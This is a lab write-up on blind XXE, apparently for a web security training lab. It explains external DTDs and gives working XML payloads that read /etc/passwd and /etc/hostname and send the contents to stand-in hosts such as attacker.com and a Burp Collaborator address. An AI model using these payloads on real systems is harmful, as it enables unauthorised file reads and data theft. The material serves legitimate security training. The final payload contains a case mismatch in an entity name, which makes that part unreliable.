Title: Exploiting blind XXE to exfiltrate data using a malicious external DTD
Level: Practitioner
Desc:  This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the /etc/hostname file. 


First of all what is the difference between classic XXE using interal entity and external DTD.
DTD - Document Type Definition
- An internal DTD is defined inside the XML document itself.
- An external DTD is loaded from an outside source, typically via a URL.
  
DTD can be used to bypass protection. 

classic XXE example using an internal entity:
```
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```
External DTDs can be used to bypass protections â€” like if entity definitions are restricted internally, but the parser still fetches external DTDs.

External DTD delivering the payload:
```
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/malicious.dtd">
<data>&sendFile;</data>
```
Then, malicious.dtd might contain:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY sendFile SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

So, using external DTD we can bypass protections and still exploit XXE vulnerability.

LAB:
go to exploit server and add the exploit:
![image](https://github.com/user-attachments/assets/805d7fe4-2bad-4d42-b65d-311e8a2112f2)
payload: 
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % sendFile SYSTEM 'http://BURP_COLLABORATOR?data=%file;'>">
%eval;
%sendfile;
```

Exploitation and calling external dtd file: 
![image](https://github.com/user-attachments/assets/31ae6e1f-5b40-4d76-b9df-0c3b932ba66b)
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0aad004b0477773880f9520301880004.exploit-server.net/exploit"> %xxe; ]>
```

When you have stacke entities you probably need to encode percent sign as : `&#x25;`
So the proper payload is :
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; sendFile SYSTEM 'http://BURP_COLLABORATOR?data=%file;'>">
%eval;
%sendfile;
```










